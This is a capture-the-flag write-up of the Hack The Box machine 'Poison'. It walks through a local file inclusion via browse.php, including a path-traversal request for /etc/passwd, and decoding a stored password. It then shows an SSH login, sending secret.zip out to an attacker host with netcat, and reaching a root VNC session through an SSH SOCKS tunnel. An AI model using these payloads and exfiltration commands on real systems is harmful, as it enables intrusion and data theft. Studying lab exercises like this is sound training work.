---
permalink: /posts/HTB/Poison
title:  "HTB Poison"
author: Luc Kolen
description: "Poison is a medium Linux machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-{Difficulty}
  - Linux
  - Local file inclusion
  - VNC
---
# 10.10.10.84 - Poison

|Hack The Box|Created by|Points|
|---|---|---|
|[Link](https://www.hackthebox.eu/home/machines/profile/132)|[Charix](https://www.hackthebox.eu/home/users/profile/11060)|30|

- [10.10.10.84 - Poison](#10101084---poison)
  - [Open ports](#open-ports)
  - [HTTP](#http)
  - [Privilege escalation](#privilege-escalation)
  - [TL;DR](#tldr)

## Open ports

```bash
luc@kali:~/HTB/Poison$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.84
```

|Port|Service|Version
|---|---|---|
22/tcp|ssh|OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
80/tcp|http|Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)

## HTTP

`http://10.10.10.84/` shows a page where we can enter what local script we want to test.

```http
GET /browse.php?file=listfiles.php HTTP/1.1
Host: 10.10.10.84

Array
(
    [0] => .
    [1] => ..
    [2] => browse.php
    [3] => index.php
    [4] => info.php
    [5] => ini.php
    [6] => listfiles.php
    [7] => phpinfo.php
    [8] => pwdbackup.txt
)
```

```http
GET /browse.php?file=pwdbackup.txt HTTP/1.1
Host: 10.10.10.84

This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
```

```bash
luc@kali:~/HTB/Poison$ cat pwdbackup.txt | base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d
Charix!2#4%6&8(0
```

We now have a password, but no usernames yet.

```http
GET /browse.php?file=../../../../../etc/passwd HTTP/1.1
Host: 10.10.10.84

# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
...
charix:*:1001:1001:charix:/home/charix:/bin/csh
```

```bash
luc@kali:~/HTB/Poison$ ssh charix@10.10.10.84
The authenticity of host '10.10.10.84 (10.10.10.84)' can't be established.
ECDSA key fingerprint is SHA256:rhYtpHzkd9nBmOtN7+ft0JiVAu8qnywLb48Glz4jZ8c.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.84' (ECDSA) to the list of known hosts.
Password for charix@Poison: Charix!2#4%6&8(0
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
You can look through a file in a nice text-based interface by typing

        less filename
charix@Poison:~ % id
uid=1001(charix) gid=1001(charix) groups=1001(charix)
charix@Poison:~ % cat user.txt
eaacdfb2************************
```

## Privilege escalation

```bash
charix@Poison:~ % pwd
/home/charix
charix@Poison:~ % ls
secret.zip      user.txt
charix@Poison:~ % md5 secret.zip
MD5 (secret.zip) = f558c7adb5695c92306361581c915dea
charix@Poison:~ % nc 10.10.14.9 443 < secret.zip
```

```bash
luc@kali:~/HTB/Poison$ sudo nc -lnvp 443 > secret.zip
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.84.
Ncat: Connection from 10.10.10.84:27865.
luc@kali:~/HTB/Poison$ md5sum secret.zip
f558c7adb5695c92306361581c915dea  secret.zip
luc@kali:~/HTB/Poison$ unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password: Charix!2#4%6&8(0
luc@kali:~/HTB/Poison$ hexdump secret
0000000 a8bd 7c5b 96d5 217a
0000008
```

We can transfer `secret.zip` to our machine and use `Charix!2#4%6&8(0` we found earlier to decrypt it, but the output doesn't look very useful for now.

```bash
charix@Poison:~ % ps aux | grep root
...
root   529   0.0  0.9  23620  8872 v0- I    13:23     0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -l
...
charix@Poison:~ % netstat -an -p tcp
...
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
```

We can see VNC running on ports 5801 and 5901.

```bash
charix@Poison:~ %
charix@Poison:~ % ~C
ssh> -D 8081
Forwarding port.
```

```bash
luc@kali:~/HTB/Poison$ sudo nano /etc/proxychains.conf
...
socks4 127.0.0.1 8081
luc@kali:~/HTB/Poison$ proxychains vncviewer 127.0.0.1:5901 -passwd secret
```

```bash
root@Poison:~ # id
uid=0(root) gid=0(whell) groups=0(whell),5(operator)
root@Poison:~ # cat /root/root.txt
716d04b1************************
```

We connect via a SSH tunnel on port 8081 and we can use the `secret` file as the password. This gets us into the server via a VNC session and we can enter commands in a open root terminal.

## TL;DR

- LFI shows credentials
- VNC password in zip file with same password as user
